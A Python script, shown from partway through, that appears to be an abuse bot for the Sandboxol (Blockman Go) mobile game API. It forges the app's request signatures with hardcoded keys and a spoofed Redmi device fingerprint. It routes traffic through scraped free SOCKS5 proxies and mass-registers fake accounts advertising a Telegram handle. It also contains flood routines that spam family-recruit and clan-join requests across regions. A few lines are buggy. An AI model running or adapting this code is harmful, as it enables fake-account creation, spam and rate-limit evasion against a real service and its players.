        chunk = query[i:i+117]
        encrypted += cipher.encrypt(chunk)
    return base64.b64encode(encrypted).decode()

def get_android_sign(android_id):
    xored_data = bytes(b ^ 0x73 for b in android_id.encode())
    padded_data = pad(xored_data, AES.block_size)

    cipher = AES.new(b"MFwwDQYJKoZIhvcN", AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(padded_data)

    return base64.b64encode(encrypted_bytes).decode()

DATA_CENTERS = []

async def cdn(session):
    async with session.get("https://pastebin.com/raw/JAUiZzvb") as response:
        ips_text = await response.text()

    ips = [ip.strip() for ip in ips_text.split(",") if ip.strip()]

    async def add_cdn(ip):
        async with session.get(f"https://dns.google/resolve?name=gw.sandboxol.com&type=A&edns_client_subnet={ip}") as response:
            payload = await response.json()
            return [
                answer["data"] for answer in payload.get("Answer", [])
                if answer.get("type") == 1 and "data" in answer
            ]

    while True:
        tasks = (add_cdn(ip) for ip in ips)
        results = await asyncio.gather(*tasks)

        unique_ips = {ip for sublist in results for ip in sublist}

        DATA_CENTERS[:] = sorted(list(unique_ips))
        print(f"DATA_CENTERS updated: {DATA_CENTERS}")

        await asyncio.sleep(6000000000000000000000)

async def proxies(session):
    while True:
        global PROXY_WORK

        prx = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/refs/heads/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",
            "https://raw.githubusercontent.com/zenjahid/FreeProxy4u/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/databay-labs/free-proxy-list/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/Skillter/ProxyGather/refs/heads/master/proxies/working-proxies-socks5.txt",
            #"https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/socks5.txt",
            "https://raw.githubusercontent.com/zebbern/Proxy-Scraper/refs/heads/main/socks5.txt"
        ]

        send = 0
        total = 0
        naxui = random.randint(1000, 9999)
        for url in prx:
            send += 1
            try:
                async with session.get(url, timeout=5) as response:
                    req = await response.text()
                req = re.sub(r"^\s+|\s+$", "", re.sub(r"^\s*$\n?", "", req, flags=re.MULTILINE), flags=re.MULTILINE).splitlines()

                if "socks5" in url:
                    req = ["socks5://" + prox.lstrip("socks5://") for prox in req]

                elif "socks4" in url:
                    req = ["socks4://" + prox.lstrip("socks4://") for prox in req]

                elif "https" in url:
                    req = ["https://" + prox.lstrip("https://") for prox in req]

                elif "http" in url:
                    req = ["http://" + prox.lstrip("http://") for prox in req]

                total += len(req)
                print(f"[{send}]", url, f"| {len(req)}")

                with open(f"bazadian{naxui}.txt", "a", encoding="utf-8") as f:
                    f.write("\n".join([re.sub(r"^(([^:]+:){2}[^:]+):.*$", r"\1", prox) for prox in req]) + "\n")
            except Exception as e:
                print(e)

        print(f"total {total}\n")

        proxies_list = ProxyUtiles.readFromFile(f"bazadian{naxui}.txt")

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, ProxyChecker.checkAll, proxies_list
        )
        print("all proxy checked")

        PROXY_WORK = [str(proxy) for proxy in result]

        print(f"Found {len(PROXY_WORK)} working proxies.")
        await asyncio.sleep(300)

async def update_endpoints(session):
    global ENDPOINTS

    async with session.get("https://pastebin.com/raw/zYLkEaLv") as response:
        ENDPOINTS = (await response.text()).split(",")

VLESS_PING = []

async def vless(session):
    async with session.get("https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/refs/heads/main/vless_configs.txt") as response:
        result = (await response.text()).split("\n")[:1000]

    result = [f"{match.group(1)}:{match.group(2)}:{''.join(line.split())}" for line in result if (match := __import__('re').search(r'vless://(?:.*@)?((?:(?:\d{1,3}\.){3}\d{1,3})|\[[^\]]+\]):(\d+)', line.strip()))]
    print(result)

    hosts_to_ping = [server.split(":")[0] for server in result if server]

    try:
        multiping_results = await icmplib.async_multiping(hosts_to_ping, count=1, timeout=0.5, concurrent_tasks=1000, privileged=True)
    except icmplib.NameLookupError as e:
        print(e)

    for host in multiping_results:
        if host.is_alive:
            VLESS_PING.append(host.address)

    print("Выполнено")
    print(VLESS_PING)

async def main():
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=0)
    ) as session:
        asyncio.create_task(update_endpoints(session))
        asyncio.create_task(cdn(session))
        #asyncio.create_task(proxies(session))
        while True:
            if not PROXY_WORK:
                await asyncio.sleep(0.1)
                continue
            break
        await asyncio.sleep(20)
        lock = asyncio.Lock()
        asyncio.create_task(create_accounts(session, lock))
        #await asyncio.sleep(15)
        #asyncio.create_task(flood_s(session, lock))
        await asyncio.sleep(9999999999999999999999999999999999999999)

ACCOUNTS = []

async def cr(lock):
    while True:
        async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
            android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
            nonce = str(uuid.uuid4())
            query = get_enc_query(android_id, nonce)
            android_sign = get_android_sign(android_id)
            xtime = str(int(time.time()))
            xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
            try:
                async with session.get(
                    f"https://gw.sandboxol.com/user/api/v5/account/auth-token",
                    timeout=2,
                    params={"q":query},
                    headers={
                        "bmg-user-id": "0",
                        "bmg-device-id": android_id,
                        "bmg-sign": android_sign,
                        "bmg-adid-sign": "98a580c5182455f00f732f48233928706925543c",
                        "package-name": "com.sandboxol.blockymods",
                        "userId": "0",
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": "ru",
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": "0",
                        "device_register_ts": "0",
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": "ru_RU",
                        "region": "",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "telecomOper": "unknown",
                        "manufacturer": "Redmi_Redmi Note 8 Pro",
                        "network": "wifi",
                        "brand": "Redmi",
                        "model": "Redmi Note 8 Pro",
                        "device": "begonia",
                        "deviceModel": "Redmi Note 8 Pro",
                        "board": "begonia",
                        "cpu": "CPU architecture: 8",
                        "cpuFrequency": "2012500",
                        "dpi": "2.75",
                        "screenHeight": "2220",
                        "screenWidth": "1080",
                        "ram_memory": "5635",
                        "rom_memory": "52438",
                        "open_id": "",
                        "open_id_type": "0",
                        "client_ip": "",
                        "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/user/api/v5/account/auth-token",
                        "Access-Token": "",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.text())
                    if (await response.json())["code"] == 1:
                        answer = await response.json()
                        user_id = str(int(answer["data"]["userId"]))
                        token = answer["data"]["accessToken"]
                        register_time = str(int(answer["data"]["registerTime"]))
                        device_register_time = str(int(answer["data"]["deviceRegisterTime"]))
                        nickname = "kn_ew.tg_" + uuid.uuid4().hex[:11]
                        nonce = str(uuid.uuid4())
                        xtime = str(int(time.time()))
                        a = "{"
                        b = "}"
                        body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761081787482114.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                        xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                        async with session.post(
                            f"https://gw.sandboxol.com/user/api/v1/user/register",
                            timeout=2,
                            data=body_string.encode(),
                            headers={
                                "bmg-device-id": android_id,
                                "userId": user_id,
                                "packageName": "official",
                                "packageNameFull": "com.sandboxol.blockymods",
                                "androidVersion": "30",
                                "OS": "android",
                                "appType": "android",
                                "appLanguage": "ru",
                                "appVersion": "5421",
                                "appVersionName": "2.125.1",
                                "channel": "sandbox",
                                "uid_register_ts": register_time,
                                "device_register_ts": device_register_time,
                                "eventType": "app",
                                "userDeviceId": android_id,
                                "userLanguage": "ru_RU",
                                "region": "RU",
                                "clientType": "client",
                                "env": "prd",
                                "package_name_en": "com.sandboxol.blockymods",
                                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                                "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "telecomOper": "unknown",
                                "manufacturer": "Redmi_Redmi Note 8 Pro",
                                "network": "wifi",
                                "brand": "Redmi",
                                "model": "Redmi Note 8 Pro",
                                "device": "begonia",
                                "deviceModel": "Redmi Note 8 Pro",
                                "board": "begonia",
                                "cpu": "CPU architecture: 8",
                                "cpuFrequency": "2012500",
                                "dpi": "2.75",
                                "screenHeight": "2220",
                                "screenWidth": "1080",
                                "ram_memory": "5635",
                                "rom_memory": "52438",
                                "open_id": "",
                                "open_id_type": "0",
                                "client_ip": "",
                                "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                                "X-Nonce": nonce,
                                "X-Time": xtime,
                                "X-Sign": xsign,
                                "X-UrlPath": "/user/api/v1/user/register",
                                "Access-Token": get_enc_token(token + nonce),
                                "Content-Type": "application/json; charset=UTF-8",
                                "Connection": "Keep-Alive",
                                "Accept-Encoding": "gzip",
                                "User-Agent": "okhttp/4.10.0"
                            }
                        ) as response:
                            print(await response.text())
                            if (await response.json())["code"] == 1:
                                answer = await response.json()
                                token = answer["data"]["accessToken"]
                                register_time = str(int(answer["data"]["registerTime"]))
                                async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
            except Exception as e:
                print(e)

async def create_accounts(session, lock):
        tasks = [asyncio.create_task(cr(lock)) for _ in range(2)]
        await asyncio.gather(*tasks)

async def flood_s(session, lock):
    async def flood_k():
        while True:
            if not ACCOUNTS:
                continue
            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
                account = random.choice(ACCOUNTS)
                user_id, token, android_id, register_time, device_register_time = account.split(":")
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
                region = "ru_RU"
                try:
                    async with session.delete(
                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        timeout=2,
                        headers={
                            "userId": user_id,
                            "packageName": "official",
                            "packageNameFull": "com.sandboxol.blockymods",
                            "androidVersion": "30",
                            "OS": "android",
                            "appType": "android",
                            "appLanguage": region[:2],
                            "appVersion": "5421",
                            "appVersionName": "2.125.1",
                            "channel": "sandbox",
                            "uid_register_ts": register_time,
                            "device_register_ts": device_register_time,
                            "eventType": "app",
                            "userDeviceId": android_id,
                            "userLanguage": region,
                            "region": "RU",
                            "clientType": "client",
                            "env": "prd",
                            "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce,
                            "X-Time": xtime,
                            "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce),
                            "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass

                    nonce = str(uuid.uuid4())
                    xtime = str(int(time.time()))
                    a = "{"
                    b = "}"
                    aa = random.choice(["1", "2", "3", "4"])
                    bb = random.choice(["1", "2", "3", "4"])
                    body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
                    xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
                    async with session.post(
                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        data=body_string.encode(),
                        timeout=2,
                        headers={
                            "language": region,
                            "userId": user_id,
                            "packageName": "official",
                            "packageNameFull": "com.sandboxol.blockymods",
                            "androidVersion": "30",
                            "OS": "android",
                            "appType": "android",
                            "appLanguage": region[:2],
                            "appVersion": "5421",
                            "appVersionName": "2.125.1",
                            "channel": "sandbox",
                            "uid_register_ts": register_time,
                            "device_register_ts": device_register_time,
                            "eventType": "app",
                            "userDeviceId": android_id,
                            "userLanguage": region,
                            "region": "RU",
                            "clientType": "client",
                            "env": "prd",
                            "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce,
                            "X-Time": xtime,
                            "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce),
                            "Content-Type": "application/json; charset=UTF-8",
                            "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass
                except Exception as e:
                    print(e)
                    continue

    tasks = [asyncio.create_task(flood_k()) for _ in range(15)]
    await asyncio.gather(*tasks)

async def clan_flood(session, clan_id, region):
    nonce = str(uuid.uuid4())
    xtime = str(int(time.time()))
    account = random.choice(ACCOUNTS)
    user_id, token, android_id, register_time, device_register_time = account.split(":")
    body_string = f'{{"clanId":{clan_id},"msg":"httрs://t.mе/kn_ew (in telegram @kn_ew)"}}'
    xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, body_string, android_id)
    try:
        async with session.post(
            f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
            timeout=2,
            data=body_string,
            headers={
                "language": region,
                "userId": user_id,
                "packageName": "official",
                "packageNameFull": "com.sandboxol.blockymods",
                "androidVersion": "30",
                "OS": "android",
                "appType": "android",
                "appLanguage": region[:2],
                "appVersion": "5421",
                "appVersionName": "2.125.1",
                "channel": "sandbox",
                "uid_register_ts": register_time,
                "device_register_ts": device_register_time,
                "eventType": "app",
                "userDeviceId": android_id,
                "userLanguage": region,
                "region": "RU",
                "clientType": "client",
                "env": "prd",
                "package_name_en": "com.sandboxol.blockymods",
                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                "X-Nonce": nonce,
                "X-Time": xtime,
                "X-Sign": xsign,
                "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                "Access-Token": get_enc_token(token + nonce),
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "gw.sandboxol.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            }
        ) as response:
            print(await response.json())
            if (await response.json())[code] == 1:
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, "", android_id)
                async with session.get(
                    f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
                    timeout=2,
                    headers={
                        "language": region,
                        "userId": user_id,
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": region[:2],
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": register_time,
                        "device_register_ts": device_register_time,
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": region,
                        "region": "RU",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                        "Access-Token": get_enc_token(token + nonce),
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.json())
    except Exception as e:
        print(e)
        return

async def clan_parsing(session):
    while True:
        nonce = str(uuid.uuid4())
        xtime = str(int(time.time()))
        account = random.choice(ACCOUNTS)
        user_id, token, android_id, register_time, device_register_time = account.split(":")
        xsign = get_xsign("/clan/api/v1/clan/tribe/recommendation", nonce, xtime, "", android_id)
        region = random.choice(
            [
                "zh_CN",
                "en_US",
                "de_DE",
                "es_ES",
                "fr_FR",
                "hi_IN",
                "in_ID",
                "it_IT",
                "ja_JP",
                "ko_KR",
                "pl_PL",
                "pt_PT",
                "ru_RU",
                "th_TH",
                "tr_TR",
                "uk_UA",
                "vi_VN"
            ]
        )
        try:
            async with session.get(
                f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/recommendation",
                timeout=2,
                headers={
                    "language": region,
                    "userId": user_id,
                    "packageName": "official",
                    "packageNameFull": "com.sandboxol.blockymods",
                    "androidVersion": "30",
                    "OS": "android",
                    "appType": "android",
                    "appLanguage": region[:2],
                    "appVersion": "5421",
                    "appVersionName": "2.125.1",
                    "channel": "sandbox",
                    "uid_register_ts": register_time,
                    "device_register_ts": device_register_time,
                    "eventType": "app",
                    "userDeviceId": android_id,
                    "userLanguage": region,
                    "region": "RU",
                    "clientType": "client",
                    "env": "prd",
                    "package_name_en": "com.sandboxol.blockymods",
                    "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                    "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                    "X-Nonce": nonce,
                    "X-Time": xtime,
                    "X-Sign": xsign,
                    "X-UrlPath": "/clan/api/v1/clan/tribe/recommendation",
                    "Access-Token": get_enc_token(token + nonce),
                    "Host": "gw.sandboxol.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": "okhttp/4.10.0"
                }
            ) as response:
                data = await response.json()
                clan_ids = [
                    clan["clanId"]
                    for clan in data["data"]
                    if clan["currentCount"] < clan["maxCount"]
                ]
                if not clan_ids:
                    continue
                await clan_flood(session, random.choice(clan_ids), region)
        except:
            continue

asyncio.run(main())
